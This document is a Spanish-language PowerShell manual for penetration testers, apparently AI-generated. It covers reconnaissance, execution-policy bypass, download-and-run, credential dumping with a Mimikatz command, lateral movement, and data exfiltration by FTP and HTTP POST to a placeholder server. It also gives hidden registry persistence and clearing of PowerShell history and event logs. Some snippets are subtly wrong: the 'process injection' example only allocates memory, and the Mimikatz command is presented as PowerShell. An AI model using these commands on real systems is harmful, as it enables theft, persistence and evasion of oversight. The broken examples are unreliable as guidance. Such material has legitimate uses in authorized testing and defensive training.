#Pentest 

# Manual de PowerShell para Pentesters

## Introducción

PowerShell es una herramienta poderosa en sistemas Windows, diseñada para automatizar tareas de administración. Sin embargo, también es una herramienta extremadamente útil para pruebas de penetración debido a su acceso nativo a la API de Windows, su capacidad para ejecutar scripts y su versatilidad.

Este manual cubre técnicas básicas y avanzadas para pentesters, incluyendo reconocimiento, explotación, y post-explotación utilizando PowerShell.

## Consideraciones Previas

Antes de comenzar, es importante tener en cuenta los siguientes puntos:

- **Ejecución de scripts**: Asegúrate de conocer la política de ejecución de scripts en el sistema objetivo. Puedes verificarla con:
  ```powershell
  Get-ExecutionPolicy
  ```
  Si está restringida, puedes cambiarla (si tienes permisos) usando:
  ```powershell
  Set-ExecutionPolicy Unrestricted
  ```
  Nota: Este cambio puede generar alertas en sistemas de seguridad.

- **Uso Ético**: Asegúrate de tener permiso para realizar cualquier prueba de penetración en el sistema.

## 1. Reconocimiento

### 1.1 Información del Sistema

Obtener información básica del sistema:
```powershell
Get-ComputerInfo
```

Para información detallada de la versión de Windows:
```powershell
(Get-WmiObject win32_operatingsystem).Version
```

### 1.2 Enumeración de Usuarios

Listar todos los usuarios locales:
```powershell
Get-LocalUser
```

Obtener información detallada sobre un usuario específico:
```powershell
Get-LocalUser -Name <NombreUsuario>
```

### 1.3 Enumeración de Servicios y Procesos

Listar servicios en ejecución:
```powershell
Get-Service | Where-Object { $_.Status -eq 'Running' }
```

Listar procesos en ejecución:
```powershell
Get-Process
```

Obtener información detallada sobre un proceso específico:
```powershell
Get-Process -Name <NombreProceso>
```

### 1.4 Enumeración de Red

Listar interfaces de red y direcciones IP:
```powershell
Get-NetIPAddress
```

Obtener la tabla de enrutamiento:
```powershell
Get-NetRoute
```

Escanear puertos abiertos en un rango de direcciones IP:
```powershell
1..254 | ForEach-Object {Test-NetConnection -ComputerName 192.168.1.$_ -Port 80}
```

## 2. Explotación

### 2.1 Ejecución de Comandos Remotos

Utilizando `Invoke-Command`, puedes ejecutar comandos en sistemas remotos (necesitas credenciales y permisos):
```powershell
Invoke-Command -ComputerName <NombreEquipo> -ScriptBlock { <Comando> } -Credential <Credencial>
```

### 2.2 Bypass de Restricciones

Si la política de ejecución de scripts está restringida, puedes intentar el bypass con `-ExecutionPolicy Bypass` al ejecutar un script:
```powershell
powershell.exe -ExecutionPolicy Bypass -File <ruta_del_script.ps1>
```

### 2.3 Descarga y Ejecución de Scripts

Descargar un archivo desde internet y ejecutarlo:
```powershell
Invoke-WebRequest -Uri <URL> -OutFile <NombreArchivo>
```
Luego, ejecutarlo con:
```powershell
.\<NombreArchivo>
```

### 2.4 Inyección de Código en Procesos

Inyectar código en un proceso existente (necesitas permisos elevados):
```powershell
$Process = Get-Process -Name <ProcesoObjetivo>
$MemoryAddress = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1024)
```
Este es un ejemplo básico de inyección, pero puede adaptarse a escenarios específicos.

## 3. Post-Explotación

### 3.1 Dump de Credenciales

Obtener un hash de las contraseñas (requiere permisos elevados):
```powershell
sekurlsa::logonpasswords
```
Este comando es parte de Mimikatz, una herramienta que se puede ejecutar a través de PowerShell para extraer credenciales.

### 3.2 Moverse Lateralmente

Utilizando credenciales obtenidas para moverse lateralmente en la red:
```powershell
Enter-PSSession -ComputerName <NombreEquipo> -Credential <Credencial>
```

### 3.3 Exfiltración de Datos

Subir archivos a un servidor remoto (por ejemplo, mediante FTP):
```powershell
$WebClient = New-Object System.Net.WebClient
$WebClient.UploadFile("<URL/Servidor>", "<RutaArchivo>")
```

O mediante HTTP POST:
```powershell
Invoke-RestMethod -Uri <URL> -Method Post -InFile <Archivo> -ContentType 'multipart/form-data'
```

### 3.4 Establecer Persistencia

Para crear un nuevo valor de registro que ejecute un script de PowerShell en cada inicio del sistema:
```powershell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Persistencia" -Value "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File <ruta_del_script.ps1>"
```

### 3.5 Limpieza de Huellas

Eliminar historial de comandos de PowerShell:
```powershell
Remove-Item (Get-PSReadlineOption).HistorySavePath
```

Eliminar registros de eventos relacionados con PowerShell:
```powershell
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
```

## 4. Herramientas Útiles de PowerShell para Pentesters

### 4.1 PowerSploit

PowerSploit es un framework para pentesters y administradores de sistemas. Para usarlo, clónalo desde GitHub y ejecútalo en PowerShell:
```powershell
git clone https://github.com/PowerShellMafia/PowerSploit.git
```

### 4.2 Nishang

Nishang es un conjunto de scripts de PowerShell para pentesting y red teaming:
```powershell
git clone https://github.com/samratashok/nishang.git
```

### 4.3 Empire

Empire es una herramienta post-explotación que utiliza PowerShell para ejecutar cargas maliciosas:
```powershell
git clone https://github.com/EmpireProject/Empire.git
```

## Conclusión

PowerShell es una herramienta poderosa para pentesters, con capacidades que van desde el reconocimiento hasta la post-explotación. Sin embargo, debido a su versatilidad y acceso profundo al sistema, también es fácil de detectar por los sistemas de seguridad modernos. Por ello, se recomienda realizar pruebas en entornos controlados y siempre con autorización.

---

**Nota**: El uso no autorizado de estas técnicas puede tener consecuencias legales. Utiliza PowerShell para pentesting solo en sistemas para los cuales tienes permiso explícito.

Este manual cubre las funciones básicas y avanzadas de PowerShell enfocadas en pruebas de penetración. Si necesitas agregar más detalles o modificar alguna sección, estaré encantado de ayudarte.